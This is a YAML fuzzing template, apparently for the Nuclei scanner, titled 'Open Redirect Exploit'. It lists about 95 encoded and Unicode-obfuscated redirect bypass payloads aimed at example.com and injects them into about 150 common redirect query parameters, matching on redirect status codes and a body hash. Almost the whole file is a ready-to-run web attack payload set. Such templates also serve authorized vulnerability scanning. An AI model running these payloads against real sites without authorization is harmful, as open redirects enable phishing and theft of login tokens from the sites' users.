id: open-redirect-exploit

info:
  name: Open Redirect Exploit
  author: anonymous
  severity: medium
  metadata:
    max-request: 100
  tags: generic,exploit,fuzzing

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method != "HEAD"'
          - 'method != "OPTIONS"'
        condition: and

    payloads:
      redirect:
        - '//example.com/'
        - '%0a/example.com/'
        - '%0d/example.com/'
        - '%00/example.com/'
        - '%09/example.com/'
        - '%5C%5Cexample.com/%252e%252e%252f'
        - '%5Cexample.com'
        - '%5cexample.com/%2f%2e%2e'
        - '%5c{{RootURL}}example.com/%2f%2e%2e'
        - '../example.com'
        - '.example.com'
        - '/%5cexample.com'
        - '////\;@example.com'
#        - '////example.com'
        - '///example.com'
        - '///example.com/%2f%2e%2e'
        - '///example.com@//'
        - '///{{RootURL}}example.com/%2f%2e%2e'
        - '//;@example.com'
        - '//\/example.com/'
        - '//\@example.com'
        - '//\example.com'
        - '//\texample.com/'
        - '//example.com/%2F..'
        - '//example.com//'
        - '//%6f%61%73%74%2e%6d%65'
        - '//example.com@//'
        - '//example.com\texample.com/'
        - '//https://example.com//'
        - '/<>//example.com'
        - '/\/\/example.com/'
        - '/\/example.com'
        - '/\example.com'
        - '/example.com'
        - '/example.com/%2F..'
        - '/example.com/'
        - '/example.com/..;/css'
        - '/https:example.com'
        - '/{{RootURL}}example.com/'
        - '/〱example.com'
        - '/〵example.com'
        - '/ゝexample.com'
        - '/ーexample.com'
        - '/ｰexample.com'
        - '<>//example.com'
        - '@example.com'
        - '@https://example.com'
        - '\/\/example.com/'
        - 'oast%E3%80%82me'
        - 'example.com'
        - 'example.com/'
        - 'example.com//'
        - 'example.com;@'
        - 'https%3a%2f%2fexample.com%2f'
        - 'https:%0a%0dexample.com'
        - 'https://%0a%0dexample.com'
        - 'https://%09/example.com'
        - 'https://%2f%2f.example.com/'
        - 'https://%3F.example.com/'
        - 'https://%5c%5c.example.com/'
        - 'https://%5cexample.com@'
        - 'https://%23.example.com/'
        - 'https://.example.com'
        - 'https://example.com'
        - 'https://////example.com'
        - 'https:///example.com'
        - 'https:///example.com/%2e%2e'
        - 'https:///example.com/%2f%2e%2e'
        - 'https:///example.com@example.com/%2e%2e'
        - 'https:///example.com@example.com/%2f%2e%2e'
        - 'https://:80#@example.com/'
        - 'https://:80?@example.com/'
        - 'https://:@\@example.com'
        - 'https://:@example.com\@example.com'
        - 'https://;@example.com'
        - 'https://\texample.com/'
        - 'https://example.com/example.com'
        - 'https://example.com/https://example.com/'
        - 'https://www.\.example.com'
        - 'https:/\/\example.com'
        - 'https:/\example.com'
        - 'https:/example.com'
        - 'https:example.com'
        - '{{RootURL}}example.com'
        - '〱example.com'
        - '〵example.com'
        - 'ゝexample.com'
        - 'ーexample.com'
        - 'ｰexample.com'
        - 'redirect/example.com'
        - 'cgi-bin/redirect.cgi?example.com'
        - 'out?example.com'
        - 'login?to=http://example.com'
        - '1/_https@example.com'
        - 'redirect?targeturl=https://example.com'

    fuzzing:
      - part: query
        type: replace
        mode: single
        keys:
          - AuthState
          - URL
          - _url
          - callback
          - checkout
          - checkout_url
          - content
          - continue
          - continueTo
          - counturl
          - data
          - dest
          - dest_url
          - destination
          - dir
          - document
          - domain
          - done
          - download
          - feed
          - file
          - file_name
          - file_url
          - folder
          - folder_url
          - forward
          - from_url
          - go
          - goto
          - host
          - html
          - http
          - https
          - image
          - image_src
          - image_url
          - imageurl
          - img
          - img_url
          - include
          - langTo
          - load_file
          - load_url
          - login_to
          - login_url
          - logout
          - media
          - navigation
          - next
          - next_page
          - open
          - out
          - page
          - page_url
          - pageurl
          - path
          - picture
          - port
          - proxy
          - r
          - r2
          - redir
          - redirect
          - redirectUri
          - redirectUrl
          - redirect_to
          - redirect_uri
          - redirect_url
          - reference
          - referrer
          - req
          - request
          - ret
          - retUrl
          - return
          - returnTo
          - return_path
          - return_to
          - return_url
          - rt
          - rurl
          - show
          - site
          - source
          - src
          - target
          - to
          - u
          - uri
          - url
          - val
          - validate
          - view
          - window
          - back
          - cgi
          - follow
          - home
          - jump
          - link
          - location
          - menu
          - move
          - nav
          - orig_url
          - out_url
          - query
          - auth
          - callback_url
          - confirm_url
          - destination_url
          - domain_url
          - entry
          - exit
          - forward_url
          - go_to
          - goto_url
          - home_url
          - image_link
          - load
          - logout_url
          - nav_to
          - origin
          - page_link
          - redirect_link
          - ref
          - referrer_url
          - return_link
          - return_to_url
          - source_url
          - target_url
          - to_url
          - validate_url
          - DirectTo
          - relay
          - service
        fuzz:
          - "{{redirect}}"

    redirects: true
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 301
          - 302
          - 307
          - 308
      - type: dsl
        dsl:
          - "md5(body) == '84238dfc8092e5d9c0dac8ef93371a07'"
